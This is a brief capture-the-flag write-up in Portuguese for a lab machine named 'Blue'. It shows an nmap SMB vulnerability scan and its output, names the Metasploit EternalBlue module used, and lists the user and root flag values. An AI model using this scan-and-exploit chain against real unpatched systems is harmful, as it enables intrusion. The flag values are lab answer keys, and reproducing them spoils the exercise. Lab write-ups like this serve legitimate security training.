# Blue WriteUp

## Scan e Enum

Comando: ```sudo nmap -sS -Pn 10.129.166.7 -script=smb-vuln* -v -oN scan.txt```

```
Nmap scan report for 10.129.166.7
Host is up (0.16s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Dec 27 09:36:23 2021 -- 1 IP address (1 host up) scanned in 126.31 seconds
```
A vulnerabilidade a ser explorada possui exploit no metasploit.

* Exploit:
```
exploit/windows/smb/ms17_010_eternalblue
```

* User Flag:
```
cd C:\Users\haris
type user.txt
4c546aea7dbee75cbd71de245c8deea9
```

* Root Flag:
```
cd C:\Users\Administrator
type root.txt
ff548eb71e920ff6c08843ce9df4e717
```
